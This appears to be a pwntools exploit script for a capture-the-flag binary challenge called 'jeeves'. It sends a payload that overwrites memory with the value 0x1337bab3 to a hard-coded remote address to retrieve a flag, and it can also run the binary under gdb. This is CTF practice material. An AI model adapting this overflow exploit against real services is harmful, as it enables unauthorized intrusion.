from pwn import *
import time

context.terminal = ['tmux', 'new-window']
target = './jeeves'
context.binary = target
binary = ELF(target)

rhost = "83.136.252.214" 
rport = 36577 

offset = 0

payload = flat(
        {offset: 0x1337bab3}
)


if args['PWN']:
    r = remote(rhost, rport) 
    r.sendlineafter('May I have your name?', payload)
    r.recvuntil('}')
    flag = r.recv()
    success(flag)
    r.close()
if args['GEF']:
    p = process(target,setuid=True)
    gdb.attach(p, gdbscript='continue')
    p.sendlineafter('May I have your name?', payload)
    time.sleep(10)
    p.recvuntil('}')
    flag = p.recv()
    success(flag)
    p.close()

